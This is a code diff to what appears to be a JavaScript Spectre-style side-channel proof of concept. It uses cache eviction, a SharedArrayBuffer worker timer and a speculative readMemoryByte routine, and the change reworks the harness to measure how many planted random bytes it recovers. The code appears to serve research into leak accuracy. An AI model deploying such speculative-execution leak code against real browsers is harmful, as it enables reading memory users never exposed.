@@ -59,7 +59,7 @@ function asmModule(stdlib,forgein,heap)
     return { vul_call: vul_call ,init: init, flush:flush}
 }
 
-
+let match_count = 0;
 
 function check(num, data_array)
 {
@@ -72,7 +72,7 @@ function check(num, data_array)
             current = evictionView.getUint32(i * offset);
     }
 
-    const worker = new Worker('./time-worker.js');
+    const worker = new self.Worker('./time-worker.js');
 
     const sharedBuffer = new SharedArrayBuffer(10 * Uint32Array.BYTES_PER_ELEMENT);
     const sharedArray = new Uint32Array(sharedBuffer);
@@ -94,6 +94,7 @@ function check(num, data_array)
     var asm = asmModule(this,{},probeTable.buffer)
     var cnt =0;
 
+    return new Promise(resolve => {
     worker.onmessage = function(msg)
     {
         function readMemoryByte(malicious_x)
@@ -182,26 +183,27 @@ function check(num, data_array)
         for (let i = 0; i < data_array.length; ++i) {
             simpleByteArray[0x2200000 + i] = data_array[i];
         }
-        let match_count = 0;
         for (let i = 0; i < data_array.length; ++i) {
             const data = readMemoryByteWrapper(0x2200000 + i);
             match_count += data == data_array[i];
         }
 
         worker.terminate();
-        postMessage([match_count, data_array.length, num]);
         // output_info_leak();
+        resolve();
         return;
     }
+    });
 }
 
-function main(cache_size) {
+async function main(cache_size) {
     if (self.SharedArrayBuffer) {
-        const data_array = [];
-        for (let i = 0; i < 50; ++i) {
-            data_array[i] = Math.random() * 256 | 0;
+        const data_length = 1e2;
+        for (let i = 0; i < data_length; ++i) {
+            await check(cache_size, [Math.random() * 256 | 0]);
         }
-        check(cache_size, data_array);
+        postMessage([match_count, data_length, cache_size]);
+        match_count = 0;
     } else {
         postMessage([0, null, cache_size]);
     }
